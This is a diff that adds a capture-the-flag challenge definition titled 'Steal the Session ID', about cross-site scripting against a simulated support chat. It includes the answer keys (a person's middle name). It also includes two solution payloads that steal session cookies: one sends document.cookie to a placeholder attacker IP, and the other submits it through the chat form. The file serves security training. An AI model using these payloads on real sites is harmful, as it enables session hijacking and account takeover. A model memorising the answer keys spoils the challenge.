@@ -1,0 +1,16 @@
+---
+:description: |
+Try to get access to the email account of Mr. Schmidt via cross-site scripting. The Solution is the middle name of Mr. Schmidt.
+
+Hint: Mr. Schmidt is part of the support team. He will read all incoming chat messages in the mail-service support chat.
+
+:category: "XSS"
+:name: "Steal the Session ID"
+:value: 10
+:keys:
+  - "xaver sebastian"
+  - "xaver sebastian schmidt"
+
+:solutions:
+  - <script>document.write("<img src='http://#ATTACKER-IP#:1337/"+document.cookie+"' />")</script>
+  - <script>document.getElementById("message").value=document.cookie;document.getElementById("chat").submit()</script>
